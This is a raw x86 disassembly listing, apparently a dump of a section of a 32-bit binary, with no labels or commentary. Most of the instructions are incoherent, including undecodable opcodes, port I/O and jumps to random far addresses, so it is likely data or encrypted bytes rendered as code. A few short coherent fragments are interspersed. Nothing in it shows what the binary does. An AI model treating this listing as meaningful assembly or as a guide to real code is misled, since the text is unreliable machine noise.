  416f4e:	or     al,0xdd
  416f50:	sbb    DWORD PTR ds:0xab96c10a,ebp
  416f56:	sub    DWORD PTR [ecx-0x39],ebp
  416f59:	icebp  
  416f5a:	or     DWORD PTR [ebx+0x41],esi
  416f5d:	jno    0x416f50
  416f5f:	aam    0x5b
  416f61:	(bad)  
  416f62:	jno    0x416f8b
  416f64:	mov    gs:0x9bb3501e,al
  416f6a:	leave  
  416f6b:	popa   
  416f6c:	mov    dh,0x90
  416f6e:	lds    esi,FWORD PTR [ebp-0x31]
  416f71:	ret    0x9722
  416f74:	pop    ebx
  416f75:	jmp    0x2faf512c
  416f7a:	ins    DWORD PTR es:[edi],dx
  416f7b:	call   FWORD PTR [edi-0x75]
  416f7e:	add    DWORD PTR [edi+ecx*1],0xdcad2ce3
  416f85:	adc    BYTE PTR [eax+0x79e15e2e],0xdc
  416f8c:	retf   0x76b
  416f8f:	leave  
  416f90:	data16 sbb cl,0x62
  416f94:	fst    DWORD PTR [ebx+0x71]
  416f97:	or     eax,0xc01c5f6c
  416f9c:	jmp    0xf86ed4d7
  416fa1:	jo     0x416ff3
  416fa3:	call   0x423dad
  416fa8:	mov    ecx,DWORD PTR [ebp-0x20]
  416fab:	mov    edx,DWORD PTR [ebp-0x1c]
  416fae:	or     eax,0x7de2
  416fb3:	sub    eax,ecx
  416fb5:	mov    ecx,DWORD PTR [ebp-0x4]
  416fb8:	jmp    0x41708c
  416fbd:	xor    al,0x6b
  416fbf:	adc    edx,DWORD PTR [edi+ebx*2+0x7c]
  416fc3:	ja     0x417030
  416fc5:	jmp    0xbfa0720a
  416fca:	enter  0x9f6a,0x7
  416fce:	add    eax,0xb70001
  416fd3:	add    BYTE PTR [eax],al
  416fd5:	lods   al,BYTE PTR ds:[esi]
  416fd6:	mov    eax,edx
  416fd8:	push   edi
  416fd9:	fnstenv [ebx-0x601c7199]
  416fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe0:	pop    ds
  416fe1:	sbb    bl,BYTE PTR [ebp+0x52012c4e]
  416fe7:	outs   dx,BYTE PTR ds:[esi]
  416fe8:	push   cs
  416fe9:	stos   DWORD PTR es:[edi],eax
  416fea:	pop    eax
  416feb:	jg     0x416fce
  416fed:	jmp    0x416fbc
  416fef:	add    BYTE PTR [ecx],0xe0
  416ff2:	jbe    0x417056
  416ff4:	in     eax,dx
  416ff5:	push   0xffffffe2
  416ff7:	add    BYTE PTR [esi+eax*8],ch
  416ffa:	add    ecx,edi
  416ffc:	mov    dh,0x49
  416ffe:	loopne 0x416ff4
  417000:	cmc    
  417001:	bound  edi,QWORD PTR [edi+eiz*2]
  417004:	jnp    0x416fe5
  417006:	test   eax,0x93aeaad5
  41700b:	and    eax,0xcdd1b9f
  417010:	xchg   edi,eax
  417011:	js     0x417024
  417013:	mov    al,ds:0x8ccdd934
  417018:	dec    esp
  417019:	xchg   ebx,esp
  41701b:	loop   0x417072
  41701d:	pop    eax
  41701e:	mov    al,ds:0xd5942b13
  417023:	sbb    DWORD PTR [edx-0x5a9efc35],edi
  417029:	sub    edx,DWORD PTR es:[edx+0x7e0b4e79]
  417030:	outs   dx,DWORD PTR gs:[esi]
  417032:	(bad)  
  417033:	dec    edx
  417034:	pusha  
  417035:	(bad)  
  417036:	push   ds
  417037:	add    ebx,ebp
  417039:	sub    ebx,DWORD PTR [ecx+0x6ff3c82a]
  41703f:	in     eax,dx
  417040:	popf   
  417041:	adc    al,0xd8
  417043:	rcl    DWORD PTR [ecx],0xee
  417046:	pop    es
  417047:	test   DWORD PTR [eax],ebp
  417049:	mov    WORD PTR [edi+ebp*2+0x2a],cs
  41704d:	jnp    0x41702b
  41704f:	pop    ss
  417050:	cmp    DWORD PTR [ebp-0x16],0xee0bb241
  417057:	not    BYTE PTR [esi+0x73f3d986]
  41705d:	(bad)  
  41705f:	sbb    cl,al
  417061:	gs es push edx
  417064:	xchg   ecx,eax
  417065:	mov    esp,0x77cda382
  41706a:	in     eax,dx
  41706b:	nop
  41706c:	cmc    
  41706d:	jle    0x41708f
  41706f:	or     al,0x1
  417071:	sub    ecx,esp
  417073:	xlat   BYTE PTR ds:[ebx]
  417074:	or     eax,0x5826b5fb
  417079:	das    
  41707a:	(bad)  
  41707b:	jg     0x4170d7
  41707d:	lods   eax,DWORD PTR ds:[esi]
  41707e:	in     eax,0x88
  417080:	pop    ss
  417081:	in     eax,dx
  417082:	je     0x41704e
  417084:	jo     0x417102
  417086:	adc    al,ch
  417088:	imul   BYTE PTR [ecx-0x3]
  41708b:	jnp    0x4170ba
  41708d:	xor    DWORD PTR [ecx+0x0],eax
  417090:	add    BYTE PTR [ecx+0x52c9c9],al
  417096:	add    BYTE PTR [ecx+0x30208e84],cl
  41709c:	(bad)  
  41709d:	(bad)  
  41709e:	jmp    0x417172
  4170a3:	xchg   ebp,eax
  4170a4:	xor    DWORD PTR [esi+edi*1-0x4460405c],esp
  4170ab:	jbe    0x4170cb
  4170ad:	mov    esi,0xa253960d
  4170b2:	mov    edi,0x105be
  4170b7:	mov    bh,0x0
  4170b9:	add    BYTE PTR [eax],al
  4170bb:	in     eax,dx
  4170bc:	xor    eax,0x677bf826
  4170c1:	xchg   ebx,eax
  4170c2:	jnp    0x417077
  4170c4:	imul   ebx,esi,0xb5eecbd8
  4170ca:	xor    al,0xf5
  4170cc:	std    
  4170cd:	and    al,0x93
  4170cf:	clc    
  4170d0:	sub    eax,0x6493d1f2
  4170d5:	cmp    DWORD PTR [esi+0x55],ebp
  4170d8:	push   ss
  4170d9:	pop    ds
  4170da:	adc    esp,DWORD PTR [ebp+0x5a]
  4170dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170de:	xchg   ebx,eax
  4170df:	jmp    0x7df1:0x42854e0
  4170e6:	push   ss
  4170e7:	sbb    eax,0x4e7b7fbf
  4170ec:	cs jo  0x4170bb
  4170ef:	pop    ebx
  4170f0:	shl    edi,0x3a
  4170f3:	and    eax,DWORD PTR [ecx-0x16]
  4170f6:	mov    ds:0x9f5b4f93,eax
  4170fb:	jecxz  0x4170d1
  4170fd:	aad    0xd0
  4170ff:	mov    eax,ds:0x406df1f5
  417104:	dec    eax
  417105:	or     DWORD PTR [edi-0x451c1b43],ebx
  41710b:	inc    esi
  41710c:	push   esp
  41710d:	jmp    0x417168
  41710f:	imul   eax,edx,0x3ecbe8ac
  417115:	bswap  eax
  417117:	repnz push eax
  417119:	imul   edi,DWORD PTR [edx],0x9
  41711c:	adc    BYTE PTR [ebp-0x584cfb92],0x21
  417123:	mov    ebx,0x3c32cb3e
  417128:	cmp    al,BYTE PTR [esi-0x3b]
  41712b:	js     0x4170ce
  41712d:	fld    TBYTE PTR [esp+ecx*8]
  417130:	fild   QWORD PTR [ecx+0x5b]
  417133:	inc    ebp
  417134:	in     eax,dx
  417135:	adc    al,0x2e
  417137:	mov    al,0x35
  417139:	dec    esp
  41713a:	jl     0x417145
  41713c:	cwde   
  41713d:	mov    ebx,0x7e87f04a
  417142:	xor    ecx,DWORD PTR [esi-0x2c]
  417145:	iret   
  417146:	test   DWORD PTR [ebx],esp
  417148:	and    DWORD PTR [ebp+0x3a0bf514],esp
  41714e:	aam    0x3a
  417150:	inc    ebp
  417151:	(bad)  
  417152:	(bad)  
  417153:	outs   dx,DWORD PTR ds:[esi]
  417154:	mov    dh,0x5f
  417156:	neg    DWORD PTR [esi+0x3f]
  417159:	dec    esp
  41715a:	out    dx,eax
  41715b:	push   edx
  41715c:	mov    eax,edx
  41715e:	sahf   
  41715f:	pop    eax
  417160:	pop    ss
  417161:	sub    al,0x81
  417163:	enter  0x28d,0x59
  417167:	aas    
  417168:	test   eax,0x23a73a1c
  41716d:	jge    0x4171a2
  41716f:	ret    0x55ce
  417172:	mov    DWORD PTR [ebp-0xc],0x5bd4
  417179:	mov    DWORD PTR [ebp-0x4],0x5b1f
  417180:	mov    eax,DWORD PTR [ebp-0x4]
  417183:	jmp    0x417257
  417188:	aaa    
  417189:	lock enter 0xcf90,0xb8
  41718e:	jg     0x417187
  417190:	inc    esi
  417191:	mov    ebx,0xbd35de70
  417196:	add    esp,DWORD PTR [ecx+0x10675]
  41719c:	mov    bh,0x0
  41719e:	add    BYTE PTR [eax],al
  4171a0:	add    ch,BYTE PTR [esp+eax*8+0x52]
  4171a4:	in     eax,dx
  4171a5:	out    0x81,eax
  4171a7:	and    bh,dh
  4171a9:	xor    BYTE PTR [eax-0x5e7563dd],bh
  4171af:	shl    bl,0x23
  4171b2:	nop
  4171b3:	push   ss
  4171b4:	daa    
  4171b5:	(bad)  
  4171b6:	aaa    
  4171b7:	xor    BYTE PTR [ecx+0x3d],dl
  4171ba:	mov    dh,0xc0
  4171bc:	(bad)  
  4171bd:	fadd   QWORD PTR [edx]
  4171bf:	scas   eax,DWORD PTR es:[edi]
  4171c0:	mov    esi,0xae9131dd
  4171c5:	push   cs
  4171c6:	mov    esp,0x7942ac50
  4171cb:	outs   dx,DWORD PTR ds:[esi]
  4171cc:	lahf   
  4171cd:	sbb    BYTE PTR [esp+ebx*1],dh
  4171d0:	dec    ecx
  4171d1:	or     DWORD PTR [edi+0x537524f],ebp
  4171d7:	sbb    bl,BYTE PTR [ebp+0x7d3f08bd]
  4171dd:	add    al,0xf3
  4171df:	gs xchg ebx,eax
  4171e1:	dec    esp
  4171e2:	lods   al,BYTE PTR ds:[esi]
  4171e3:	in     al,dx
  4171e4:	fimul  DWORD PTR [edi+0x5b05d618]
  4171ea:	jmp    0x41721f
  4171ec:	sub    esi,DWORD PTR [esi-0x66e8d263]
  4171f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f3:	pop    ecx
  4171f4:	cmp    esi,DWORD PTR [edx-0x1df30d59]
  4171fa:	shl    ch,0x99
  4171fd:	bound  ebx,QWORD PTR [ecx-0x14a73b60]
  417203:	push   esp
  417204:	into   
  417205:	int    0xab
  417207:	xchg   esp,eax
  417208:	sbb    dl,BYTE PTR [edx+0x2c6bdb61]
  41720e:	jo     0x41725a
  417210:	mov    bl,0x54
  417212:	je     0x41722c
  417214:	sub    ecx,DWORD PTR [esi+0x1d6a7fa3]
  41721a:	push   es
  41721b:	pop    edi
  41721c:	xchg   eax,edi
  41721e:	ret    0x3343
  417221:	call   0xb2e:0x7e77a440
  417228:	inc    esp
  417229:	jo     0x417206
  41722b:	ins    DWORD PTR es:[edi],dx
  41722c:	sbb    eax,0xea8c4f8
  417231:	(bad)  
  417232:	pushf  
  417233:	lods   eax,DWORD PTR ds:[esi]
  417234:	out    0xe1,al
  417236:	or     ecx,ecx
  417238:	mov    ch,0x85
  41723a:	or     ecx,eax
  41723c:	pop    ds
  41723d:	lock out 0xff,eax
  417240:	pop    ebx
  417241:	mov    ss,WORD PTR [ebx-0x5d]
  417244:	test   BYTE PTR [ecx-0x785ebc47],dh
  41724a:	adc    DWORD PTR [ebp-0x72168157],0xd050e0d8
  417254:	xor    cl,BYTE PTR [ebx-0xbb27435]
  41725a:	jmp    0x41732e
  41725f:	mov    ecx,0x8d898dbd
  417264:	mov    ecx,0x5e04bdbd
  417269:	mov    eax,0xf3667b6e
  41726e:	mov    eax,ds:0x1072c
  417273:	mov    bh,0x0
  417275:	add    BYTE PTR [eax],al
  417277:	inc    esi
  417278:	or     eax,0x6a872099
  41727d:	bound  edx,QWORD PTR [esi]
  41727f:	sub    eax,0xbfd1902
  417284:	je     0x417211
  417286:	xchg   DWORD PTR [ebx],edi
  417288:	add    DWORD PTR [ebp-0x2c],0x16a9fbd2
  41728f:	mov    ds:0xf968db34,al
  417294:	jnp    0x41724a
  417296:	pusha  
  417297:	retf   0xdceb
  41729a:	inc    edx
  41729b:	(bad)  
  41729c:	sahf   
  41729d:	cdq    
  41729e:	jecxz  0x4172fb
  4172a0:	fs mov bh,0x9
  4172a3:	add    BYTE PTR [ebp+0x5a],dh
  4172a6:	push   eax
  4172a7:	test   eax,0xabdd5d9f
  4172ac:	mov    ebp,0xd1e896e3
  4172b1:	push   0xffffff80
  4172b3:	push   ecx
  4172b4:	jecxz  0x41725a
  4172b6:	in     eax,dx
  4172b7:	cmp    DWORD PTR [edi+0x622bda4e],eax
  4172bd:	cwde   
  4172be:	pop    ebp
  4172bf:	xor    ebx,DWORD PTR [edi-0x680dd12a]
  4172c5:	hlt    
  4172c6:	inc    esp
  4172c7:	pop    ecx
  4172c8:	and    eax,0xad752b41
  4172cd:	outs   dx,BYTE PTR ds:[esi]
  4172ce:	jge    0x41729d
  4172d0:	push   0xc92e855c
  4172d5:	retf   
  4172d6:	xchg   esp,eax
  4172d7:	jae    0x41734b
  4172d9:	lods   al,BYTE PTR ds:[esi]
  4172da:	test   DWORD PTR [edx+0x3e508af9],0x1628c2c2
  4172e4:	shl    BYTE PTR [ebx-0x37],0xc7
  4172e8:	or     eax,0xa266614
  4172ed:	in     al,dx
  4172ee:	in     al,dx
  4172ef:	icebp  
  4172f0:	leave  
  4172f1:	popa   
  4172f2:	cmp    BYTE PTR [eax-0x59fd1693],dl
  4172f8:	inc    eax
  4172f9:	xchg   BYTE PTR [edx],ch
  4172fb:	sub    DWORD PTR [eax+0x76],edx
  4172fe:	retf   
  4172ff:	mov    dh,0xe7
  417301:	xlat   BYTE PTR ds:[ebx]
  417302:	mov    ecx,0x6569194c
  417307:	sub    ecx,esi
  417309:	scas   eax,DWORD PTR es:[edi]
  41730a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730b:	mov    ah,0x6a
  41730d:	dec    ebp
  41730e:	mov    WORD PTR [edi],ds
  417310:	or     al,0x57
  417312:	and    eax,ebp
  417314:	mov    esi,0x8d8d71b3
  417319:	add    eax,0x96016e16
  41731e:	mov    ebx,0xfd37f176
  417323:	xchg   BYTE PTR [edi+0x3c],ch
  417326:	sub    bh,BYTE PTR [ebp+0x6b77db28]
  41732c:	push   esi
  41732d:	xor    BYTE PTR [ecx-0x40],ch
  417330:	inc    ecx
  417331:	sub    BYTE PTR [eax],al
  417333:	add    BYTE PTR [ebx],cl
  417335:	shr    ecx,0xcf
  417338:	add    BYTE PTR [eax],al
  41733a:	add    BYTE PTR [edi],cl
  41733c:	mov    ebx,0x7bb473b0
  417341:	iret   
  417342:	inc    eax
  417344:	mov    al,ds:0x4a33a5
  417349:	leave  
  41734a:	xor    esp,ebx
  41734c:	pop    es
  41734d:	add    DWORD PTR [eax],eax
  41734f:	mov    bh,0x0
  417351:	add    BYTE PTR [eax],al
  417353:	stc    
  417354:	hlt    
  417355:	loope  0x417304
  417357:	dec    edi
  417358:	sbb    eax,0xd7e52703
  41735d:	int3   
  41735e:	jne    0x4172e1
  417360:	pop    esp
  417361:	cmp    DWORD PTR [ebx-0x1307826d],edi
  417367:	cs nop
  417369:	xchg   ebp,eax
  41736a:	adc    esi,DWORD PTR [ebp+0x531b7a67]
  417370:	stos   BYTE PTR es:[edi],al
  417371:	jg     0x417333
  417373:	loop   0x4173c0
  417375:	or     DWORD PTR [eax-0x2c],esi
  417378:	fs cli 
  41737a:	and    al,0x39
  41737c:	imul   esi,edx,0xfbebe0c4
  417382:	xchg   edi,eax
  417383:	sbb    ecx,DWORD PTR [esp+edi*4-0x21]
  417387:	idiv   BYTE PTR [ebp+0x7c]
  41738a:	sub    dl,BYTE PTR [ebp+0x7e]
  41738d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41738e:	sub    ah,BYTE PTR [ecx+0x14]
  417391:	sub    ebx,DWORD PTR [eax]
  417393:	xchg   edx,eax
  417394:	shl    DWORD PTR [esi+0x35186d40],1
  41739a:	pop    ecx
  41739b:	fbld   TBYTE PTR [ecx-0x6e27a7e6]
  4173a1:	cmp    esp,ecx
  4173a3:	add    eax,ebp
  4173a5:	cmp    ebp,edx
  4173a7:	cmp    DWORD PTR [edx+0x619718b4],edx
  4173ad:	inc    ebp
  4173ae:	lea    edx,[ecx+0x45fece0f]
  4173b4:	fisubr WORD PTR [ecx-0x6d]
  4173b7:	cmp    DWORD PTR [ecx+0x6ce465e],ebx
  4173bd:	pop    esp
  4173be:	in     al,0x88
  4173c0:	ds icebp 
  4173c2:	add    DWORD PTR [esi],0x41958208
  4173c8:	outs   dx,DWORD PTR ds:[esi]
  4173c9:	pop    eax
  4173ca:	jg     0x4173fb
  4173cc:	ins    DWORD PTR es:[edi],dx
  4173cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173ce:	adc    eax,0xc879522
  4173d3:	push   es
  4173d4:	fcomp  QWORD PTR [edi]
  4173d6:	popf   
  4173d7:	arpl   ax,bx
  4173d9:	add    DWORD PTR [eax-0x5a],edx
  4173dc:	mov    ebp,0x9ae852e0
  4173e1:	loopne 0x417400
  4173e3:	dec    esp
  4173e4:	sbb    eax,0xc499cf33
  4173e9:	in     al,dx
  4173ea:	sub    DWORD PTR [ecx+0x6b],ebx
  4173ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ee:	mov    bl,BYTE PTR [edx]
  4173f0:	enter  0xa2da,0x25
  4173f4:	scas   eax,DWORD PTR es:[edi]
  4173f5:	stos   DWORD PTR es:[edi],eax
  4173f6:	rol    BYTE PTR [ecx],cl
  4173f8:	outs   dx,BYTE PTR ds:[esi]
  4173f9:	lahf   
  4173fa:	hlt    
  4173fb:	ret    0x286e
  4173fe:	or     esp,DWORD PTR [esi+0x59]
  417401:	cmp    BYTE PTR [edi+0x421e2403],dh
  417407:	lahf   
  417408:	(bad)  
  417409:	sbb    al,0x5
  41740b:	stos   DWORD PTR es:[edi],eax
  41740c:	pop    esi
  41740d:	add    BYTE PTR [eax],al
  41740f:	xor    edx,edx
  417411:	mov    ecx,0x4824
  417416:	div    ecx
  417418:	mov    ecx,DWORD PTR [ebp+0x8]
  41741b:	jmp    0x4174ef
  417420:	xchg   esp,ebx
  417422:	push   0xefb67b02
  417427:	ffree  st(1)
  417429:	lock sbb eax,0x815bd5bf
  41742f:	imul   ebx,DWORD PTR [edx-0x48fffef8],0xa000000
  417439:	ja     0x4173c0
  41743b:	in     eax,0xba
  41743d:	scas   eax,DWORD PTR es:[edi]
  41743e:	ins    BYTE PTR es:[edi],dx
  41743f:	jg     0x41744f
  417441:	fldcw  WORD PTR [ebx-0x60]
  417444:	mov    ?,WORD PTR [ebp-0x16]
  417447:	(bad)  
  417448:	jnp    0x41745e
  41744a:	dec    esi
  41744b:	adc    eax,0xa2908329
  417450:	cmp    eax,0xdf1a6324
  417455:	mov    esp,0xf2ca06db
  41745a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41745b:	add    eax,0x61231b5
  417460:	jmp    0x417487
  417462:	(bad)
  417466:	cmp    eax,0x27e0773a
  41746b:	add    esi,ecx
  41746d:	and    dh,0xa1
  417470:	popa   
  417471:	ficom  WORD PTR [edi+0x504ca7d]
  417477:	call   0x39ff2dad
  41747c:	xchg   ebx,eax
  41747d:	test   eax,0x8df4534f
  417482:	add    al,0x6c
  417484:	xchg   esi,eax
  417485:	dec    esp
  417486:	js     0x417507
  417488:	loope  0x4174bb
  41748a:	sbb    ebp,ebx
  41748c:	and    edx,edx
  41748e:	or     ch,BYTE PTR [ecx-0x40368e24]
  417494:	mov    ds:0x314ea4f2,eax
  417499:	add    edx,DWORD PTR [ebx]
  41749b:	js     0x417487
  41749d:	mov    edx,0xf263f865
  4174a2:	or     ecx,esi
  4174a4:	dec    edi
  4174a5:	mov    ds:0xaddf2d9b,eax
  4174aa:	popf   
  4174ab:	mov    WORD PTR [ecx],ss
  4174ad:	jno    0x417445
  4174af:	mov    ecx,0xbd3db51e
  4174b4:	ficomp DWORD PTR [ecx+edx*4]
  4174b7:	xor    cl,bh
  4174b9:	aam    0xae
  4174bb:	or     eax,DWORD PTR [ebp+0x4ada8a60]
  4174c1:	sti    
  4174c2:	add    ecx,0x2a
  4174c5:	fistp  QWORD PTR [edi+ebp*8]
  4174c8:	adc    edx,DWORD PTR [eax+0x1d90ab06]
  4174ce:	sub    edi,eax
  4174d0:	lock jo 0x4174d1
  4174d3:	mov    al,ds:0xb1621d11
  4174d8:	xor    al,0x7f
  4174da:	mov    ah,0x17
  4174dc:	xchg   edx,eax
  4174dd:	sbb    esi,0x4fe5d5a5
  4174e3:	mov    al,ds:0x6fdee883
  4174e8:	push   ecx
  4174e9:	sar    BYTE PTR [esi-0x4a],0x58
  4174ed:	mov    dh,BYTE PTR [edi-0x27ca2dcd]
  4174f3:	xor    al,BYTE PTR [eax]
  4174f5:	add    BYTE PTR [ecx-0x38fb79b4],cl
  4174fb:	inc    ebp
  4174fc:	or     BYTE PTR [ebx-0x74ffff9e],al
  417502:	inc    ebp
  417503:	or     BYTE PTR ds:0x2492,dh
  417509:	jmp    0x4175dd
  41750e:	jmp    0x41755d
  417510:	dec    esp
  417511:	sbb    dh,ch
  417513:	sbb    edi,edi
  417515:	inc    DWORD PTR [ebx-0x54]
  417518:	inc    edi
  417519:	jp     0x417587
  41751b:	pushf  
  41751c:	das    
  41751d:	ficom  WORD PTR [ecx+0x9]
  417520:	add    DWORD PTR [eax],eax
  417522:	mov    bh,0x0
  417524:	add    BYTE PTR [eax],al
  417526:	mov    DWORD PTR ds:0x25ba0af2,edi
  41752c:	rcl    ebp,0xed
  41752f:	jbe    0x4174f0
  417531:	loop   0x4174fb
  417533:	mov    bh,0x9e
  417535:	or     DWORD PTR [ecx+0x10],ebx
  417538:	ror    ecx,cl
  41753a:	dec    ecx
  41753b:	xor    al,0x3e
  41753d:	xlat   BYTE PTR ds:[ebx]
  41753e:	adc    esi,DWORD PTR [edi-0xc]
  417541:	retf   
  417542:	outs   dx,DWORD PTR ds:[esi]
  417543:	mov    edx,0xcbf67cf6
  417548:	nop
  417549:	add    DWORD PTR [eax],ebx
  41754b:	or     dh,0x92
  41754e:	sbb    ecx,esi
  417550:	fstp   QWORD PTR [ecx-0x26aed3c0]
  417556:	jge    0x41755f
  417558:	int    0x9e
  41755a:	int    0x71
  41755c:	mov    al,ds:0xbf5b7a78
  417561:	inc    edi
  417562:	inc    ebx
  417563:	pop    ecx
  417564:	or     al,0x7e
  417566:	in     eax,dx
  417567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417568:	test   dl,bl
  41756a:	sub    eax,0x7c4bd86e
  41756f:	sbb    BYTE PTR [edx+0x4c],dl
  417572:	pop    eax
  417573:	jg     0x4175da
  417575:	pop    es
  417576:	sub    eax,0x15beeb67
  41757b:	lea    ebp,[eax+0x15]
  41757e:	or     eax,DWORD PTR [ebp+0x69]
  417581:	cmp    al,0xe0
  417583:	imul   eax,eax,0xc9444155
  417589:	push   eax
  41758a:	(bad)  
  41758b:	mov    ds:0x8ca4c14,eax
  417590:	jbe    0x41760f
  417592:	xchg   esp,eax
  417593:	xor    al,0x99
  417595:	add    BYTE PTR [eax-0x41a1ba4b],cl
  41759b:	cmp    ah,BYTE PTR [ebp-0x8]
  41759e:	mov    ch,0x19
  4175a0:	sub    bl,BYTE PTR [ecx]
  4175a2:	dec    esi
  4175a3:	mov    dh,cl
  4175a5:	and    al,0x93
  4175a7:	push   esi
  4175a8:	xchg   edi,eax
  4175a9:	and    al,BYTE PTR [ebp-0x47]
  4175ac:	inc    ecx
  4175ad:	or     BYTE PTR [edi+0x526a9f96],bl
  4175b3:	(bad)  
  4175b4:	shl    DWORD PTR [edx+edx*8-0x60b5b6fc],1
  4175bb:	mov    eax,0x1e1dbcd9
  4175c0:	lds    esp,FWORD PTR [edx]
  4175c2:	call   0x983b:0x83ffb4a6
  4175c9:	test   al,0xf7
  4175cb:	loope  0x417555
  4175cd:	xchg   BYTE PTR [ebp-0x23b231b2],dh
  4175d3:	xchg   ebp,eax
  4175d4:	xchg   ecx,eax
  4175d5:	pop    ss
  4175d6:	loop   0x417637
  4175d8:	retf   
  4175d9:	cmp    eax,0x25a8c2b4
  4175de:	shl    DWORD PTR [eax+eax*1+0x0],cl
  4175e2:	add    eax,0xc09e
  4175e7:	xor    eax,0x3d61
  4175ec:	mov    ecx,0x9ce7
  4175f1:	div    ecx
  4175f3:	mov    ecx,DWORD PTR [ebp+0xc]
  4175f6:	jmp    0x4176ca
  4175fb:	das    
  4175fc:	imul   ebx,DWORD PTR [edx+0x6d],0x6b3f7f5e
  417603:	packuswb mm6,mm3
  417606:	mov    eax,ds:0x95f1976c
  41760b:	or     BYTE PTR [edx],cl
  41760d:	add    DWORD PTR [eax],eax
  41760f:	mov    bh,0x0
  417611:	add    BYTE PTR [eax],al
  417613:	inc    ecx
  417614:	sbb    ebp,ecx
  417616:	fisttp WORD PTR [di-0x7d]
  41761a:	test   DWORD PTR [ecx],ebx
  41761c:	sbb    eax,0xf0bf5580
  417621:	dec    edi
  417622:	inc    edi
  417623:	xor    edx,DWORD PTR [ecx]
  417625:	cs adc al,0x7b
  417628:	push   0x7f6e5e02
  41762d:	jmp    0xe25f:0x79b5f20f
  417634:	or     ebx,DWORD PTR [esi]
  417636:	dec    edi
  417637:	std    
  417638:	repz dec ebp
  41763a:	or     al,0xcf
  41763c:	cs add al,bh
  41763f:	or     al,0x62
  417641:	retf   0x4705
  417644:	mov    esi,0xaeae0a2b
  417649:	lods   al,BYTE PTR ds:[esi]
  41764a:	dec    esp
  41764b:	lahf   
  41764c:	sahf   
  41764d:	dec    esi
  41764e:	xchg   ecx,eax
  41764f:	push   cs
  417650:	mov    esp,0xac9a886b
  417655:	add    ecx,DWORD PTR [edx+0x34f192d9]
  41765b:	fcom   QWORD PTR [esi-0x1640a440]
  417661:	or     eax,DWORD PTR [eax+0x45b78528]
  417667:	add    BYTE PTR [edx-0x3c983390],al
  41766d:	shl    DWORD PTR [ebp-0x2],1
  417670:	retf   
  417671:	cmp    al,dl
  417673:	push   esi
  417674:	xlat   BYTE PTR ds:[ebx]
  417675:	xchg   ebp,eax
  417676:	mov    ah,0x1b
  417678:	(bad)  
  417679:	sub    BYTE PTR [edi],ah
  41767b:	xchg   ebp,eax
  41767c:	jbe    0x41765c
  41767e:	ret    0x3a10
  417681:	pop    ebp
  417682:	mov    cl,0x4e
  417684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417685:	push   ebx
  417686:	outs   dx,DWORD PTR ds:[esi]
  417687:	mov    dl,0x2e
  417689:	test   al,0x12
  41768b:	push   ebx
  41768c:	push   ebp
  41768d:	bound  edx,QWORD PTR [esi]
  41768f:	pop    esp
  417690:	jae    0x4176ef
  417692:	mov    dh,dh
  417694:	fwait
  417695:	sub    ah,0xe7
  417698:	in     al,0x6e
  41769a:	mov    dh,0xbc
  41769c:	pop    ds
  41769d:	xchg   esp,eax
  41769e:	xor    BYTE PTR [esi+0x569c060e],0xf7
  4176a5:	fwait
  4176a6:	pop    ebp
  4176a7:	and    DWORD PTR [ebp+0x56f43a5a],edx
  4176ad:	in     al,0x66
  4176af:	push   0x99feca8d
  4176b4:	inc    ebp
  4176b5:	fwait
  4176b6:	out    0xd6,eax
  4176b8:	add    al,0xca
  4176ba:	mov    ebx,DWORD PTR [esi+0x11]
  4176bd:	pusha  
  4176be:	lods   al,BYTE PTR ds:[esi]
  4176bf:	test   BYTE PTR [edx+edi*4],0x10
  4176c3:	and    BYTE PTR ss:[eax],bh
  4176c6:	cdq    
  4176c7:	ror    dl,1
  4176c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176ca:	mov    DWORD PTR [esi+eax*4+0x4],ecx
  4176ce:	mov    DWORD PTR [ebp-0xc],0x1112
  4176d5:	jmp    0x4177a9
  4176da:	push   cs
  4176db:	retf   
  4176dc:	fisub  DWORD PTR [ecx-0x10804e21]
  4176e2:	pop    ecx
  4176e3:	popf   
  4176e4:	xor    ah,cl
  4176e6:	or     DWORD PTR [edx+0x48],ecx
  4176e9:	in     al,0xbf
  4176eb:	or     al,BYTE PTR [ecx]
  4176ed:	add    BYTE PTR [edi+0x63000000],dh
  4176f3:	out    dx,eax
  4176f4:	cdq    
  4176f5:	push   cs
  4176f6:	leave  
  4176f7:	or     DWORD PTR [ebp+0x14],ebp
  4176fa:	and    eax,0xf5397463
  4176ff:	inc    ecx
  417700:	adc    DWORD PTR [eax-0x66f2c275],edx
  417706:	cmp    BYTE PTR [ecx-0x3c88fe07],dl
  41770c:	pop    ebx
  41770d:	in     eax,dx
  41770e:	adc    dh,0x90
  417711:	sbb    al,0x84
  417713:	or     eax,0x8fe480db
  417718:	lahf   
  417719:	push   ecx
  41771a:	imul   esp
  41771c:	mov    eax,ds:0x5a6bbb5e
  417721:	fs cs xor edx,edx
  417725:	call   0xd37c:0x9bb3f2a0
  41772c:	sbb    DWORD PTR [ecx+0x37],ecx
  41772f:	lds    eax,FWORD PTR [edx+0x5006cd67]
  417735:	add    eax,0x6d1331eb
  41773a:	fwait
  41773b:	int3   
  41773c:	xor    al,0x43
  41773e:	or     eax,0xf7765414
  417743:	and    ah,BYTE PTR [ebx]
  417745:	mov    dl,bl
  417747:	xchg   DWORD PTR [edx*8-0x3817f973],ebp
  41774e:	inc    eax
  41774f:	in     al,0x4
  417751:	outs   dx,DWORD PTR ds:[esi]
  417752:	dec    ecx
  417753:	xor    ecx,DWORD PTR [ecx]
  417755:	or     al,0x49
  417757:	push   esi
  417758:	inc    edi
  417759:	xchg   edx,eax
  41775a:	fstp   DWORD PTR ds:0xca3b80cc
  417760:	cli    
  417761:	mov    dh,0xc0
  417763:	loope  0x417768
  417765:	imul   ebx,DWORD PTR ds:0xbfbb02cd,0xffffffa0
  41776c:	push   edi
  41776d:	scas   eax,DWORD PTR es:[edi]
  41776e:	xchg   esi,eax
  41776f:	adc    DWORD PTR [edi-0x35b1ee87],ecx
  417775:	pop    ebx
  417776:	pop    es
  417777:	jmp    0x31456f47
  41777c:	push   esi
